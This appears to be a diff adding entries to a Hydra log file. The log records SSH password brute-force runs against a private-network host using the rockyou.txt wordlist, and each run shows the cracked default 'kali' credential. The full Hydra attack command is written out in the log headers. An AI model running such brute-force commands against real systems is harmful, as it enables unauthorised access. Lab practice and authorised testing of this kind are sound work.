@@ -3,3 +3,5 @@
 [22][ssh] host: 192.168.1.91   login: kali   password: kali
 # Hydra v9.5 run at 2024-02-01 10:41:17 on 192.168.1.91 ssh (hydra -l kali -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.91:22)
 [22][ssh] host: 192.168.1.91   login: kali   password: kali
+# Hydra v9.5 run at 2024-02-01 18:23:00 on 192.168.1.91 ssh (hydra -l kali -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.91:22)
+[22][ssh] host: 192.168.1.91   login: kali   password: kali
